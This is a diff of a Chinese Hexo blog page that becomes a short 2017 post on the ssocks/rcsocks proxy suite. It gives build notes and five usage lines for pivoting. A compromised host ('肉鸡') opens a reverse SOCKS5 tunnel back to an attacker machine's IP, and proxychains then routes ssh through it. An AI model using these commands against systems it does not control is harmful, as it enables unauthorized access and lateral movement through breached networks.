@@ -70,7 +70,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="代理,端口转发,ssocks," />
 
 
 
@@ -86,16 +86,18 @@
 
 
 
-<meta name="description" content="一些笔记和记录">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MapleGe">
-<meta property="og:url" content="http://maplege.github.io/tags/Linux/index.html">
+<meta name="description" content="SSOCKS的使用方法记录">
+<meta name="keywords" content="代理,端口转发,ssocks">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssocks（RCSOCKS代理工具套装）">
+<meta property="og:url" content="http://maplege.github.io/2017/09/13/ssocks/index.html">
 <meta property="og:site_name" content="MapleGe">
-<meta property="og:description" content="一些笔记和记录">
+<meta property="og:description" content="SSOCKS的使用方法记录">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-09-13T13:27:56.351Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MapleGe">
-<meta name="twitter:description" content="一些笔记和记录">
+<meta name="twitter:title" content="ssocks（RCSOCKS代理工具套装）">
+<meta name="twitter:description" content="SSOCKS的使用方法记录">
 
 
 
@@ -125,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://maplege.github.io/tags/Linux/"/>
+  <link rel="canonical" href="http://maplege.github.io/2017/09/13/ssocks/"/>
 
 
 
 
 
-  <title>标签: Linux | MapleGe</title>
+  <title>ssocks（RCSOCKS代理工具套装） | MapleGe</title>
   
 
 
@@ -150,7 +152,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -288,54 +290,268 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Linux<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://maplege.github.io/2017/09/13/ssocks/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="暮沉沉">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://img.jsqq.net/uploads/allimg/150111/1_150111080328_19.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MapleGe">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2017/09/04/socksTOhttp/" itemprop="url">
-              
-                <span itemprop="name">Linux下使用privoxy将socks转换为http代理</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">ssocks（RCSOCKS代理工具套装）</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-04T08:52:08+08:00"
-              content="2017-09-04" >
-          09-04
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-13T21:26:00+08:00">
+                2017-09-13
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/端口转发/" itemprop="url" rel="index">
+                    <span itemprop="name">端口转发</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  193
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>SSOCKS的使用方法记录<br><a id="more"></a></p>
+<h1 id="SSOCKS（RCSOCKS代理工具套装）"><a href="#SSOCKS（RCSOCKS代理工具套装）" class="headerlink" title="SSOCKS（RCSOCKS代理工具套装）"></a>SSOCKS（RCSOCKS代理工具套装）</h1><p>这个工具有两个版本：windows和Linux的，可以混用</p>
+<p>Windows的直接使用ssocks-win32即可</p>
+<p>Linux的需要先进行编译：./configure        make</p>
+<p>ssocksd 用来开启Socks5代理服务</p>
+<p>ssocks 本地启用Socks5服务，并反弹到另一IP地址</p>
+<p>rcsocks 接收反弹过来的Socks5服务，并转向另一端口</p>
+<h2 id="使用说明："><a href="#使用说明：" class="headerlink" title="使用说明："></a>使用说明：</h2><p>Linux中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">攻击机上：./rcsocks -l 10086 -p 10010 -vv</div><div class="line">肉鸡上：./rssocks -vv -s 攻击机IP:10010</div><div class="line">kali中自带proxychains端口代理工具</div><div class="line">/etc/proxychains.conf	进行配置（底部）127.0.0.1 socks5 10086</div><div class="line">proxychains ssh root@ip（此处的IP假设自己是肉鸡） 然后该软件就会走刚设置的端口</div></pre></td></tr></table></figure>
+<p>windows则需要在cmd中运行，使用方法同Linux类似</p>
 
       
     </div>
+    
+    
+    
 
+	
+	  <div>
+	     
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+    
+    <!-- JS库 sweetalert 可修改路径 -->
+	  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+	    <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+		  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+		    <p><span>本文标题:</span><a href="/2017/09/13/ssocks/">ssocks（RCSOCKS代理工具套装）</a></p>
+			  <p><span>文章作者:</span><a href="/" title="访问 暮沉沉 的个人博客">暮沉沉</a></p>
+			    <p><span>发布时间:</span>2017年09月13日 - 21:09</p>
+				  <p><span>最后更新:</span>2017年09月13日 - 21:09</p>
+				    <p><span>原始链接:</span><a href="/2017/09/13/ssocks/" title="ssocks（RCSOCKS代理工具套装）">http://maplege.github.io/2017/09/13/ssocks/</a>
+					    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://maplege.github.io/2017/09/13/ssocks/"  aria-label="复制成功！"></i></span>
+						  </p>
+						    <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+							</div>
+							<script> 
+							    var clipboard = new Clipboard('.fa-clipboard');
+								    clipboard.on('success', $(function(){
+												      $(".fa-clipboard").click(function(){
+															          swal({   
+																			            title: "",   
+																						          text: '复制成功',   
+																								            html: false,
+																											          timer: 500,   
+																													            showConfirmButton: false
+																																        });
+																	        });
+													      }));  
+</script>
+
+
+	  </div>
+	
+
+
+    
+
+	
+	  <div>
+	    
+<div>
+    
+	        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+			    
+				</div>
+
+	  </div>
+	
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代理/" rel="tag"><i class="fa fa-tag"></i> 代理</a>
+          
+            <a href="/tags/端口转发/" rel="tag"><i class="fa fa-tag"></i> 端口转发</a>
+          
+            <a href="/tags/ssocks/" rel="tag"><i class="fa fa-tag"></i> ssocks</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/08/st2-053/" rel="next" title="Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境（转载）">
+                <i class="fa fa-chevron-left"></i> Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境（转载）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/13/scriptProxy/" rel="prev" title="脚本代理工具使用总结">
+                脚本代理工具使用总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -343,6 +559,10 @@
 
 
           
+  <div class="comments" id="comments">
+    
+  </div>
+
 
         </div>
         
@@ -363,8 +583,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="http://img.jsqq.net/uploads/allimg/150111/1_150111080328_19.jpg"
@@ -442,6 +671,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSOCKS（RCSOCKS代理工具套装）"><span class="nav-number">1.</span> <span class="nav-text">SSOCKS（RCSOCKS代理工具套装）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#使用说明："><span class="nav-number">1.1.</span> <span class="nav-text">使用说明：</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -573,10 +818,10 @@
   
 
   
-    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
 <script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
 
-  
+
 
   
 
